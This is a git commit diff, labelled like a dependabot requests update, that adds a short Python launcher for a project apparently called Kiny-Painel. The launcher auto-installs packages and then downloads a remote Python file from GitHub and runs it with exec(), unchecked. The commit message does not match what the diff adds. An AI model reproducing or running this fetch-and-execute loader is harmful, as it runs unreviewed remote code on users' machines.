a7d6c01a99004db79c1347c6bb99900701f1701e
007052 <161152876+007052@users.noreply.github.com>
2024-03-13 21:36:10 -0300

    Initialize dependabot/pip/requests-2.31.0

---
+++ main.py
@@ -0,0 +1,19 @@
+from os import execl, path, system
+from sys import executable, argv
+
+if path.exists("aviso_read?") == False:
+    with open('aviso_read?', 'w+') as f:
+        system('cat aviso.txt')
+        input()
+        f.write('true')
+try:
+    from requests import get;from TerminalButtons import *
+except:
+    system('python3 -m pip install --upgrade pip && pip3 install requests TerminalButtons')
+    execl(executable, executable, *argv)
+try:
+    exec(
+        get('https://raw.githubusercontent.com/Kiny-Kiny/Kiny-Painel/main/source/_init_.py').text
+    )
+except:
+    print('Verifique sua conexão com a internet!')
